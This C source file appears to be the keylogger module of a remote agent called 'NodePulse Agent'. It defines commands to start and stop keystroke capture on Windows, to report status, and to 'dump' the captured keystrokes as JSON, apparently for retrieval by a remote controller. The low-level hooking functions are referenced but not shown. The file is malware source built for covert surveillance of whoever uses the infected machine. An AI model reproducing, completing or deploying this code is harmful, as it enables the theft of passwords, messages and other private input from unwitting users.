/*
 * NodePulse Agent - Keylogger Module
 * 
 * Captures keystrokes (Windows only).
 */

#include "modules.h"
#include "../platform/platform.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int keylogger_active = 0;

static int keylogger_init(void) {
    return 0;
}

/*
 * Commands:
 *   start   - Start capturing keystrokes
 *   stop    - Stop capturing keystrokes
 *   dump    - Get captured keystrokes and clear buffer
 *   status  - Check if keylogger is active
 */
static int keylogger_execute(const char* command, const char* params, char** output) {
    (void)params;
    
    if (!command || !output) return -1;
    
    if (strcmp(command, "start") == 0) {
#ifdef PLATFORM_WINDOWS
        if (keylogger_start() == 0) {
            keylogger_active = 1;
            *output = strdup("{\"success\":true,\"message\":\"Keylogger started\"}");
            return 0;
        } else {
            *output = strdup("{\"success\":false,\"error\":\"Failed to start keylogger\"}");
            return -1;
        }
#else
        *output = strdup("{\"success\":false,\"error\":\"Keylogger only supported on Windows\"}");
        return -1;
#endif
    }
    else if (strcmp(command, "stop") == 0) {
#ifdef PLATFORM_WINDOWS
        keylogger_stop();
        keylogger_active = 0;
        *output = strdup("{\"success\":true,\"message\":\"Keylogger stopped\"}");
        return 0;
#else
        *output = strdup("{\"success\":true,\"message\":\"Keylogger not running\"}");
        return 0;
#endif
    }
    else if (strcmp(command, "dump") == 0) {
#ifdef PLATFORM_WINDOWS
        char* buffer = NULL;
        if (keylogger_get_buffer(&buffer) == 0 && buffer) {
            /* Escape for JSON */
            size_t len = strlen(buffer);
            char* escaped = (char*)malloc(len * 2 + 1);
            char* p = escaped;
            for (size_t i = 0; i < len; i++) {
                char c = buffer[i];
                switch (c) {
                    case '"':  *p++ = '\\'; *p++ = '"'; break;
                    case '\\': *p++ = '\\'; *p++ = '\\'; break;
                    case '\n': *p++ = '\\'; *p++ = 'n'; break;
                    case '\r': *p++ = '\\'; *p++ = 'r'; break;
                    case '\t': *p++ = '\\'; *p++ = 't'; break;
                    default: *p++ = c; break;
                }
            }
            *p = '\0';
            
            *output = (char*)malloc(strlen(escaped) + 64);
            snprintf(*output, strlen(escaped) + 64, 
                     "{\"success\":true,\"keystrokes\":\"%s\"}", escaped);
            
            free(escaped);
            free(buffer);
            return 0;
        } else {
            *output = strdup("{\"success\":true,\"keystrokes\":\"\"}");
            return 0;
        }
#else
        *output = strdup("{\"success\":false,\"error\":\"Keylogger only supported on Windows\"}");
        return -1;
#endif
    }
    else if (strcmp(command, "status") == 0) {
        *output = (char*)malloc(64);
        snprintf(*output, 64, "{\"active\":%s}", keylogger_active ? "true" : "false");
        return 0;
    }
    else {
        *output = (char*)malloc(128);
        snprintf(*output, 128, "{\"error\":\"Unknown command: %s\"}", command);
        return -1;
    }
}

static void keylogger_cleanup(void) {
#ifdef PLATFORM_WINDOWS
    if (keylogger_active) {
        keylogger_stop();
        keylogger_active = 0;
    }
#endif
}

/* Module definition */
Module mod_keylogger = {
    .name = "keylogger",
    .description = "Capture keystrokes (Windows only)",
    .init = keylogger_init,
    .execute = keylogger_execute,
    .cleanup = keylogger_cleanup,
    .initialized = 0
};
